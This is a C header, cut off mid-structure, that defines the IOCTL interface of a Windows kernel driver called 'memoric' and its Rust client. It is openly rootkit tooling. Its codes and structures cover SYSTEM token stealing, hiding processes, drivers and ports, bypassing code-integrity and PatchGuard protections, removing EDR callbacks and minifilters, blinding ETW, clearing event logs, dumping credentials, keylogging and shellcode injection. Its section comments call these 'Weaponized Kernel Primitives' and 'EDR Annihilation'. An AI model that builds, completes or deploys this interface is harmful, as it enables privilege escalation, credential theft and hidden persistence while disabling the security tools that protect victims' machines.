/*
 * memoric.h - Shared definitions for memoric kernel driver
 *
 * Defines IOCTLs, request/response structures shared between
 * the kernel driver (C) and usermode client (Rust).
 *
 * IMPORTANT: Keep struct layouts in sync with src/driver.rs
 */

#pragma once

#ifdef _KERNEL_MODE
#include <ntifs.h>
#else
#include <windows.h>
#include <winioctl.h>
#endif

/* ================================================================
 * Device Names
 * ================================================================ */

#define MEMORIC_DEVICE_NAME     L"\\Device\\Memoric"
#define MEMORIC_SYMLINK_NAME    L"\\DosDevices\\Memoric"
#define MEMORIC_USERMODE_PATH   "\\\\.\\Memoric"
#define MEMORIC_DEVICE_TYPE     0x8000
#define MEMORIC_ABI_VERSION     1
#define MEMORIC_DRIVER_VERSION_MAJOR 1
#define MEMORIC_DRIVER_VERSION_MINOR 1
#define MEMORIC_DRIVER_VERSION  ((MEMORIC_DRIVER_VERSION_MAJOR << 16) | MEMORIC_DRIVER_VERSION_MINOR)

/* ================================================================
 * IOCTL Codes (METHOD_BUFFERED, FILE_ANY_ACCESS)
 *
 * CTL_CODE(DeviceType, Function, Method, Access)
 * = (DeviceType << 16) | (Access << 14) | (Function << 2) | Method
 * ================================================================ */

#define IOCTL_MEMORIC_PHYS_READ      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002000 */
#define IOCTL_MEMORIC_PHYS_WRITE     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002004 */
#define IOCTL_MEMORIC_VIRT_READ      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002008 */
#define IOCTL_MEMORIC_VIRT_WRITE     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000200C */
#define IOCTL_MEMORIC_GET_CR3        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002010 */
#define IOCTL_MEMORIC_GET_EPROCESS   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002014 */
#define IOCTL_MEMORIC_TOKEN_STEAL    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002018 */
#define IOCTL_MEMORIC_DKOM_HIDE      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000201C */
#define IOCTL_MEMORIC_PPL_REMOVE     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002020 */
#define IOCTL_MEMORIC_WRITE_KERNEL   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002024 */
#define IOCTL_MEMORIC_VA_TO_PA       CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002028 */

/* === NEW IOCTLs === */
#define IOCTL_MEMORIC_ENUM_PROCESS   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000202C */
#define IOCTL_MEMORIC_MODULE_HIDE    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002030 */
#define IOCTL_MEMORIC_THREAD_HIDE    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002034 */
#define IOCTL_MEMORIC_CALLBACK_ENUM  CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002038 */
#define IOCTL_MEMORIC_CALLBACK_REMOVE CTL_CODE(MEMORIC_DEVICE_TYPE, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x8000203C */
#define IOCTL_MEMORIC_PATCH_KERNEL   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002040 */
#define IOCTL_MEMORIC_APC_INJECT     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002044 */
#define IOCTL_MEMORIC_HANDLE_STRIP   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002048 */
#define IOCTL_MEMORIC_REG_PROTECT    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000204C */
#define IOCTL_MEMORIC_NOTIFY_ROUTINE CTL_CODE(MEMORIC_DEVICE_TYPE, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002050 */
#define IOCTL_MEMORIC_PE_DUMP        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002054 */
#define IOCTL_MEMORIC_SET_DEBUG_PORT CTL_CODE(MEMORIC_DEVICE_TYPE, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002058 */
#define IOCTL_MEMORIC_DPC_TIMER      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000205C */
#define IOCTL_MEMORIC_PORT_HIDE      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002060 */
#define IOCTL_MEMORIC_TOKEN_DUP      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002064 */
#define IOCTL_MEMORIC_OBJECT_HOOK    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002068 */
#define IOCTL_MEMORIC_DRIVER_STATS   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000206C */
#define IOCTL_MEMORIC_MEMORY_POOL    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002070 */
#define IOCTL_MEMORIC_MINIFILTER_ENUM CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002074 */
#define IOCTL_MEMORIC_PROCESS_DUMP   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002078 */
#define IOCTL_MEMORIC_HYPERVISOR_DETECT CTL_CODE(MEMORIC_DEVICE_TYPE, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x8000207C */

/* === Phase 9: Test Signing Bypass + Global Hooks + Auto-Inject === */
#define IOCTL_MEMORIC_TESTSIGN_HIDE  CTL_CODE(MEMORIC_DEVICE_TYPE, 0x820, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002080 */
#define IOCTL_MEMORIC_GLOBAL_HOOK    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002084 */
#define IOCTL_MEMORIC_AUTO_INJECT    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002088 */
#define IOCTL_MEMORIC_INFINITY_HOOK  CTL_CODE(MEMORIC_DEVICE_TYPE, 0x823, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x8000208C */

/* === Phase 10: Kernel Module Base Query === */
#define IOCTL_MEMORIC_GET_MODULE_BASE CTL_CODE(MEMORIC_DEVICE_TYPE, 0x824, METHOD_BUFFERED, FILE_ANY_ACCESS)  /* 0x80002090 */

/* === Phase 11: CI Bypass (SeCiCallbacks + CiValidateImageHeader + PTE) === */
#define IOCTL_MEMORIC_CI_CALLBACK_PATCH CTL_CODE(MEMORIC_DEVICE_TYPE, 0x825, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002094 */
#define IOCTL_MEMORIC_CI_FUNC_PATCH     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x826, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002098 */
#define IOCTL_MEMORIC_PTE_RW            CTL_CODE(MEMORIC_DEVICE_TYPE, 0x827, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x8000209C */

/* === Phase 12: Weaponized Kernel Primitives === */
#define IOCTL_MEMORIC_MSR_RW            CTL_CODE(MEMORIC_DEVICE_TYPE, 0x828, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020A0 */
#define IOCTL_MEMORIC_DRIVER_CLOAK      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x829, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020A4 */
#define IOCTL_MEMORIC_FORCE_KILL        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82A, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020A8 */
#define IOCTL_MEMORIC_FORCE_DELETE      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82B, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020AC */
#define IOCTL_MEMORIC_SYSTEM_THREAD     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82C, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020B0 */
#define IOCTL_MEMORIC_KERNEL_EXEC       CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82D, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020B4 */
#define IOCTL_MEMORIC_PPL_BYPASS        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82E, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020B8 */
#define IOCTL_MEMORIC_CR_RW             CTL_CODE(MEMORIC_DEVICE_TYPE, 0x82F, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020BC */
#define IOCTL_MEMORIC_IDT_RW            CTL_CODE(MEMORIC_DEVICE_TYPE, 0x830, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020C0 */
#define IOCTL_MEMORIC_UNLOADED_DRV_CLEAR CTL_CODE(MEMORIC_DEVICE_TYPE, 0x831, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020C4 */
#define IOCTL_MEMORIC_TOKEN_SWAP        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x832, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020C8 */
#define IOCTL_MEMORIC_PROCESS_PROTECT   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x833, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020CC */

/* === Phase 13: Advanced Weaponized Primitives === */
#define IOCTL_MEMORIC_KEYLOGGER         CTL_CODE(MEMORIC_DEVICE_TYPE, 0x834, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020D0 */
#define IOCTL_MEMORIC_REG_HIDE          CTL_CODE(MEMORIC_DEVICE_TYPE, 0x835, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020D4 */
#define IOCTL_MEMORIC_FILE_LOCK         CTL_CODE(MEMORIC_DEVICE_TYPE, 0x836, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020D8 */
#define IOCTL_MEMORIC_ETW_BLIND         CTL_CODE(MEMORIC_DEVICE_TYPE, 0x837, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020DC */
#define IOCTL_MEMORIC_EPROCESS_SPOOF    CTL_CODE(MEMORIC_DEVICE_TYPE, 0x838, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020E0 */
#define IOCTL_MEMORIC_EVENT_LOG_CLEAR   CTL_CODE(MEMORIC_DEVICE_TYPE, 0x839, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020E4 */
#define IOCTL_MEMORIC_CRED_DUMP         CTL_CODE(MEMORIC_DEVICE_TYPE, 0x83A, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020E8 */
#define IOCTL_MEMORIC_DRIVER_IMPERSONATE CTL_CODE(MEMORIC_DEVICE_TYPE, 0x83B, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020EC */

/* === Phase 14: EDR Annihilation & Kernel Stealth === */
#define IOCTL_MEMORIC_CALLBACK_NUKE     CTL_CODE(MEMORIC_DEVICE_TYPE, 0x83C, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020F0 */
#define IOCTL_MEMORIC_MINIFILTER_DETACH CTL_CODE(MEMORIC_DEVICE_TYPE, 0x83D, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020F4 */
#define IOCTL_MEMORIC_KERNEL_APC_INJECT CTL_CODE(MEMORIC_DEVICE_TYPE, 0x83F, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x800020FC */
#define IOCTL_MEMORIC_WFP_REMOVE        CTL_CODE(MEMORIC_DEVICE_TYPE, 0x840, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002100 */
#define IOCTL_MEMORIC_CAPABILITIES      CTL_CODE(MEMORIC_DEVICE_TYPE, 0x841, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002104 */

/* ================================================================
 * Limits
 * ================================================================ */

#define MEMORIC_MAX_IO_SIZE         (4 * 1024 * 1024)   /* 4 MB max transfer */
#define MEMORIC_MAX_FORCE_WRITE     4096                 /* 4 KB max force-write */
#define MEMORIC_POOL_TAG            'croM'               /* "Mcro" */

#define MEMORIC_CAP_PHYSICAL_MEMORY     (1ULL << 0)
#define MEMORIC_CAP_VIRTUAL_MEMORY      (1ULL << 1)
#define MEMORIC_CAP_PROCESS_INFO        (1ULL << 2)
#define MEMORIC_CAP_KERNEL_WRITE        (1ULL << 3)
#define MEMORIC_CAP_PROCESS_ENUM        (1ULL << 4)
#define MEMORIC_CAP_CALLBACKS           (1ULL << 5)
#define MEMORIC_CAP_REGISTRY_PROTECT    (1ULL << 6)
#define MEMORIC_CAP_NOTIFICATIONS       (1ULL << 7)
#define MEMORIC_CAP_PROCESS_DUMP        (1ULL << 8)
#define MEMORIC_CAP_HYPERVISOR_DETECT   (1ULL << 9)
#define MEMORIC_CAP_TESTSIGN            (1ULL << 10)
#define MEMORIC_CAP_GLOBAL_HOOKS        (1ULL << 11)
#define MEMORIC_CAP_KERNEL_EXEC         (1ULL << 12)
#define MEMORIC_CAP_DESTRUCTIVE_OPS     (1ULL << 13)

/* ================================================================
 * Request / Response Structures
 *
 * All structs use natural alignment (no packing).
 * Must match Rust #[repr(C)] definitions exactly.
 * ================================================================ */

/* Physical memory read */
typedef struct _MEMORIC_PHYS_REQUEST {
    ULONG64 PhysicalAddress;
    ULONG   Size;
    ULONG   Reserved;
} MEMORIC_PHYS_REQUEST, *PMEMORIC_PHYS_REQUEST;
/* sizeof = 16 */

/* Physical memory write (data follows header in buffer) */
typedef struct _MEMORIC_PHYS_WRITE_REQUEST {
    ULONG64 PhysicalAddress;
    ULONG   Size;
    ULONG   Reserved;
    /* UCHAR Data[Size] follows immediately */
} MEMORIC_PHYS_WRITE_REQUEST, *PMEMORIC_PHYS_WRITE_REQUEST;
/* sizeof = 16, followed by variable data */

/* Virtual memory read (cross-process or kernel) */
typedef struct _MEMORIC_VIRT_REQUEST {
    ULONG   ProcessId;          /* 0 or 4 = kernel memory */
    ULONG   Size;
    ULONG64 Address;
} MEMORIC_VIRT_REQUEST, *PMEMORIC_VIRT_REQUEST;
/* sizeof = 16 */

/* Virtual memory write (cross-process, data follows header) */
typedef struct _MEMORIC_VIRT_WRITE_REQUEST {
    ULONG   ProcessId;
    ULONG   Size;
    ULONG64 Address;
    /* UCHAR Data[Size] follows immediately */
} MEMORIC_VIRT_WRITE_REQUEST, *PMEMORIC_VIRT_WRITE_REQUEST;
/* sizeof = 16 */

/* Get CR3 / DirectoryTableBase */
typedef struct _MEMORIC_CR3_REQUEST {
    ULONG   ProcessId;          /* 0 = current process */
    ULONG   Reserved;
} MEMORIC_CR3_REQUEST, *PMEMORIC_CR3_REQUEST;

typedef struct _MEMORIC_CR3_RESPONSE {
    ULONG64 Cr3Value;
    ULONG64 EprocessAddress;
} MEMORIC_CR3_RESPONSE, *PMEMORIC_CR3_RESPONSE;

/* Get EPROCESS info + dynamic offsets */
typedef struct _MEMORIC_EPROCESS_REQUEST {
    ULONG   ProcessId;
    ULONG   Reserved;
} MEMORIC_EPROCESS_REQUEST, *PMEMORIC_EPROCESS_REQUEST;

typedef struct _MEMORIC_EPROCESS_RESPONSE {
    ULONG64 EprocessAddress;            /* 0x00 */
    ULONG64 Token;                      /* 0x08: EX_FAST_REF token value */
    ULONG64 DirectoryTableBase;         /* 0x10 */
    ULONG64 UniqueProcessId;            /* 0x18 */
    ULONG   UniqueProcessIdOff;         /* 0x20: offset in EPROCESS */
    ULONG   ActiveProcessLinksOff;      /* 0x24 */
    ULONG   TokenOff;                   /* 0x28 */
    ULONG   ProtectionOff;              /* 0x2C */
    ULONG   ImageFileNameOff;           /* 0x30 */
    ULONG   VadRootOff;                 /* 0x34 */
    UCHAR   ImageFileName[16];          /* 0x38: up to 15 chars + null */
} MEMORIC_EPROCESS_RESPONSE, *PMEMORIC_EPROCESS_RESPONSE;
/* sizeof = 72 (0x48) */

/* Token steal */
typedef struct _MEMORIC_TOKEN_REQUEST {
    ULONG   SourcePid;          /* usually 4 for SYSTEM */
    ULONG   TargetPid;
} MEMORIC_TOKEN_REQUEST, *PMEMORIC_TOKEN_REQUEST;

/* DKOM process hide */
typedef struct _MEMORIC_HIDE_REQUEST {
    ULONG   ProcessId;
    ULONG   Reserved;
} MEMORIC_HIDE_REQUEST, *PMEMORIC_HIDE_REQUEST;

/* PPL removal */
typedef struct _MEMORIC_PPL_REQUEST {
    ULONG   ProcessId;
    ULONG   Reserved;
} MEMORIC_PPL_REQUEST, *PMEMORIC_PPL_REQUEST;

/* Force kernel write (CR0.WP bypass, data follows header) */
typedef struct _MEMORIC_KERNEL_WRITE_REQUEST {
    ULONG64 Address;
    ULONG   Size;
    ULONG   Reserved;
    /* UCHAR Data[Size] follows immediately */
} MEMORIC_KERNEL_WRITE_REQUEST, *PMEMORIC_KERNEL_WRITE_REQUEST;
/* sizeof = 16 */

/* VA to PA translation */
typedef struct _MEMORIC_VA2PA_REQUEST {
    ULONG   ProcessId;          /* 0 = current/kernel context */
    ULONG   Reserved;
    ULONG64 VirtualAddress;
} MEMORIC_VA2PA_REQUEST, *PMEMORIC_VA2PA_REQUEST;

typedef struct _MEMORIC_VA2PA_RESPONSE {
    ULONG64 PhysicalAddress;
} MEMORIC_VA2PA_RESPONSE, *PMEMORIC_VA2PA_RESPONSE;

/* ================================================================
 * New Structures for additional IOCTLs
 * ================================================================ */

/* Process enumeration entry (kernel-walked ActiveProcessLinks) */
typedef struct _MEMORIC_PROCESS_ENTRY {
    ULONG   ProcessId;
    ULONG   ParentProcessId;
    ULONG64 EprocessAddress;
    ULONG64 Token;
    ULONG64 DirectoryTableBase;
    UCHAR   ImageFileName[16];
    UCHAR   Protection;         /* PS_PROTECTION value */
    UCHAR   Reserved[7];
} MEMORIC_PROCESS_ENTRY, *PMEMORIC_PROCESS_ENTRY;
/* sizeof = 56 */

/* Process enumeration request */
typedef struct _MEMORIC_ENUM_PROCESS_REQUEST {
    ULONG   MaxEntries;     /* max processes to return (0 = default 1024) */
    ULONG   Reserved;
} MEMORIC_ENUM_PROCESS_REQUEST, *PMEMORIC_ENUM_PROCESS_REQUEST;

/* Module hide request - hides a kernel driver from PsLoadedModuleList */
typedef struct _MEMORIC_MODULE_HIDE_REQUEST {
    WCHAR   DriverName[64]; /* e.g. L"memoric.sys" or L"\\Driver\\memoric" */
} MEMORIC_MODULE_HIDE_REQUEST, *PMEMORIC_MODULE_HIDE_REQUEST;
/* sizeof = 128 */

/* Thread hide - remove thread from threadlist */
typedef struct _MEMORIC_THREAD_HIDE_REQUEST {
    ULONG   ThreadId;
    ULONG   ProcessId;      /* owning process */
} MEMORIC_THREAD_HIDE_REQUEST, *PMEMORIC_THREAD_HIDE_REQUEST;

/* Callback types for enumeration/removal */
#define MEMORIC_CALLBACK_PROCESS    0   /* PsSetCreateProcessNotifyRoutine */
#define MEMORIC_CALLBACK_THREAD     1   /* PsSetCreateThreadNotifyRoutine */
#define MEMORIC_CALLBACK_IMAGE      2   /* PsSetLoadImageNotifyRoutine */
#define MEMORIC_CALLBACK_REGISTRY   3   /* CmRegisterCallbackEx */
#define MEMORIC_CALLBACK_OBJECT     4   /* ObRegisterCallbacks */

/* Callback enumeration request */
typedef struct _MEMORIC_CALLBACK_ENUM_REQUEST {
    ULONG   CallbackType;   /* MEMORIC_CALLBACK_* */
    ULONG   MaxEntries;     /* max entries to return */
} MEMORIC_CALLBACK_ENUM_REQUEST, *PMEMORIC_CALLBACK_ENUM_REQUEST;

/* Callback entry result */
typedef struct _MEMORIC_CALLBACK_ENTRY {
    ULONG64 CallbackAddress;    /* function pointer */
    ULONG64 DriverBase;         /* owning driver base address */
    ULONG64 Cookie;             /* registry callback cookie (for CmUnRegister) */
    ULONG   Index;              /* index in callback array */
    ULONG   Type;               /* MEMORIC_CALLBACK_* */
    CHAR    DriverName[32];     /* driver name if resolved */
} MEMORIC_CALLBACK_ENTRY, *PMEMORIC_CALLBACK_ENTRY;
/* sizeof = 64 */

/* Callback removal request */
typedef struct _MEMORIC_CALLBACK_REMOVE_REQUEST {
    ULONG   CallbackType;       /* MEMORIC_CALLBACK_* type */
    ULONG   Index;              /* index from enum result */
    ULONG64 CallbackAddress;    /* the callback function address (for verification) */
    ULONG64 Cookie;             /* registry callback cookie / object callback list entry */
} MEMORIC_CALLBACK_REMOVE_REQUEST, *PMEMORIC_CALLBACK_REMOVE_REQUEST;

/* Targeted kernel patching */
#define MEMORIC_PATCH_ETW_TI    0   /* Patch EtwTiLogXxx functions */
#define MEMORIC_PATCH_DSE       1   /* Patch ci!g_CiEnabled/g_CiOptions */
#define MEMORIC_PATCH_PG        2   /* Disable PatchGuard timer (experimental) */

typedef struct _MEMORIC_PATCH_REQUEST {
    ULONG   PatchType;      /* MEMORIC_PATCH_* */
    ULONG   Enable;         /* 0 = disable/patch, 1 = restore/enable */
} MEMORIC_PATCH_REQUEST, *PMEMORIC_PATCH_REQUEST;

/* Kernel APC injection */
typedef struct _MEMORIC_APC_INJECT_REQUEST {
    ULONG   ProcessId;          /* target process */
    ULONG   ThreadId;           /* target thread (0 = first alertable thread) */
    ULONG64 ShellcodeAddress;   /* VA in target process (already allocated+written) */
    ULONG   ShellcodeSize;      /* size of shellcode */
    ULONG   Reserved;
} MEMORIC_APC_INJECT_REQUEST, *PMEMORIC_APC_INJECT_REQUEST;

/* Handle table stripping - remove handle access rights from other processes */
#define MEMORIC_HANDLE_STRIP_PROCESS    0   /* Strip process handles */
#define MEMORIC_HANDLE_STRIP_THREAD     1   /* Strip thread handles */

typedef struct _MEMORIC_HANDLE_STRIP_REQUEST {
    ULONG   TargetPid;          /* PID whose handles should be stripped */
    ULONG   StripType;          /* MEMORIC_HANDLE_STRIP_* */
    ULONG   AccessMask;         /* access rights to remove (0 = remove all) */
    ULONG   Reserved;
} MEMORIC_HANDLE_STRIP_REQUEST, *PMEMORIC_HANDLE_STRIP_REQUEST;

typedef struct _MEMORIC_HANDLE_STRIP_RESPONSE {
    ULONG   HandlesModified;    /* number of handles modified */
    ULONG   Reserved;
} MEMORIC_HANDLE_STRIP_RESPONSE, *PMEMORIC_HANDLE_STRIP_RESPONSE;

/* ================================================================
 * Registry Protection — CmRegisterCallbackEx-based
 * ================================================================ */

#define MEMORIC_REG_PROTECT_ADD      0   /* Add key to protection list */
#define MEMORIC_REG_PROTECT_REMOVE   1   /* Remove key from protection list */
#define MEMORIC_REG_PROTECT_LIST     2   /* List protected keys */
#define MEMORIC_REG_PROTECT_CLEAR    3   /* Clear all protections */

typedef struct _MEMORIC_REG_PROTECT_REQUEST {
    ULONG   Action;             /* MEMORIC_REG_PROTECT_* */
    ULONG   Flags;              /* 1=block delete, 2=block modify, 4=block create, 7=block all */
    WCHAR   KeyPath[256];       /* Registry key path (e.g. L"\\Registry\\Machine\\SOFTWARE\\MyApp") */
} MEMORIC_REG_PROTECT_REQUEST, *PMEMORIC_REG_PROTECT_REQUEST;
/* sizeof = 520 */

typedef struct _MEMORIC_REG_PROTECT_ENTRY {
    ULONG   Index;
    ULONG   Flags;
    WCHAR   KeyPath[256];       /* stored key path */
} MEMORIC_REG_PROTECT_ENTRY, *PMEMORIC_REG_PROTECT_ENTRY;
/* sizeof = 520 */

/* ================================================================
 * Notification Routine Registration
 * ================================================================ */

#define MEMORIC_NOTIFY_PROCESS_CREATE  0   /* Log process creation/exit */
#define MEMORIC_NOTIFY_THREAD_CREATE   1   /* Log thread creation/exit */
#define MEMORIC_NOTIFY_IMAGE_LOAD      2   /* Log image loads */

#define MEMORIC_NOTIFY_ACTION_REGISTER   0
#define MEMORIC_NOTIFY_ACTION_UNREGISTER 1
#define MEMORIC_NOTIFY_ACTION_QUERY      2   /* Query logged events */

typedef struct _MEMORIC_NOTIFY_REQUEST {
    ULONG   NotifyType;     /* MEMORIC_NOTIFY_PROCESS/THREAD/IMAGE */
    ULONG   Action;         /* MEMORIC_NOTIFY_ACTION_* */
    ULONG   MaxEvents;      /* max events to return for QUERY */
    ULONG   Reserved;
} MEMORIC_NOTIFY_REQUEST, *PMEMORIC_NOTIFY_REQUEST;

/* Logged notification event */
typedef struct _MEMORIC_NOTIFY_EVENT {
    ULONG   EventType;      /* MEMORIC_NOTIFY_PROCESS/THREAD/IMAGE */
    ULONG   ProcessId;
    ULONG   ThreadId;       /* for thread events */
    ULONG   ParentProcessId;/* for process events */
    ULONG64 ImageBase;      /* for image events */
    ULONG64 ImageSize;      /* for image events */
    ULONG64 Timestamp;      /* KeQuerySystemTimePrecise */
    UCHAR   Create;         /* 1=create, 0=exit/unload */
    UCHAR   Reserved[7];
    WCHAR   ImageName[128]; /* image path for image load events */
} MEMORIC_NOTIFY_EVENT, *PMEMORIC_NOTIFY_EVENT;
/* sizeof = 304 */

/* ================================================================
 * PE Dump — dump process image from kernel memory
 * ================================================================ */

typedef struct _MEMORIC_PE_DUMP_REQUEST {
    ULONG   ProcessId;      /* target process */
    ULONG   Reserved;
    ULONG64 BaseAddress;    /* base address of PE (0 = main module) */
    ULONG   MaxSize;        /* max dump size in bytes (0 = auto from PE header) */
    ULONG   Reserved2;
} MEMORIC_PE_DUMP_REQUEST, *PMEMORIC_PE_DUMP_REQUEST;

typedef struct _MEMORIC_PE_DUMP_RESPONSE {
    ULONG64 BaseAddress;    /* actual base address dumped */
    ULONG   ImageSize;      /* actual image size */
    ULONG   Reserved;
    /* raw PE bytes follow this header */
} MEMORIC_PE_DUMP_RESPONSE, *PMEMORIC_PE_DUMP_RESPONSE;
/* sizeof = 16, followed by variable data */

/* ================================================================
 * Anti-Debug — DebugPort manipulation
 * ================================================================ */

#define MEMORIC_DEBUG_CLEAR_PORT      0   /* Zero DebugPort */
#define MEMORIC_DEBUG_SET_NO_DEBUG    1   /* Set NoDebugInherit flag */
#define MEMORIC_DEBUG_HIDE_FROM_DBG   2   /* Clear all debug indicators */

typedef struct _MEMORIC_DEBUG_PORT_REQUEST {
    ULONG   ProcessId;      /* target process */
    ULONG   Action;         /* MEMORIC_DEBUG_* */
} MEMORIC_DEBUG_PORT_REQUEST, *PMEMORIC_DEBUG_PORT_REQUEST;

/* ================================================================
 * DPC Timer — Schedule delayed kernel DPC execution
 * ================================================================ */

#define MEMORIC_DPC_SCHEDULE        0   /* Schedule new timer */
#define MEMORIC_DPC_CANCEL          1   /* Cancel running timer */
#define MEMORIC_DPC_QUERY           2   /* Query timer status */

typedef struct _MEMORIC_DPC_TIMER_REQUEST {
    ULONG   Action;         /* MEMORIC_DPC_* */
    ULONG   TimerIndex;     /* timer slot (0-7) */
    ULONG64 DelayMs;        /* delay in milliseconds (for schedule) */
    ULONG   TargetPid;      /* target PID for DPC operation */
    ULONG   Operation;      /* 0=log, 1=hide_process, 2=escalate_token */
} MEMORIC_DPC_TIMER_REQUEST, *PMEMORIC_DPC_TIMER_REQUEST;

typedef struct _MEMORIC_DPC_TIMER_RESPONSE {
    ULONG   TimerIndex;     /* which slot */
    ULONG   Active;         /* 1=running, 0=idle */
    ULONG64 RemainingMs;    /* approximate remaining time */
    ULONG   FireCount;      /* how many times DPC has fired */
    ULONG   Reserved;
} MEMORIC_DPC_TIMER_RESPONSE, *PMEMORIC_DPC_TIMER_RESPONSE;

/* ================================================================
 * Port Hide — Hide TCP/UDP ports from netstat
 * ================================================================ */

#define MEMORIC_PORT_HIDE_ADD       0   /* Add port to hide list */
#define MEMORIC_PORT_HIDE_REMOVE    1   /* Remove port from hide list */
#define MEMORIC_PORT_HIDE_LIST      2   /* List hidden ports */
#define MEMORIC_PORT_HIDE_CLEAR     3   /* Clear all hidden ports */
#define MEMORIC_MAX_HIDDEN_PORTS    32

typedef struct _MEMORIC_PORT_HIDE_REQUEST {
    ULONG   Action;         /* MEMORIC_PORT_HIDE_* */
    USHORT  Port;           /* port number (host byte order) */
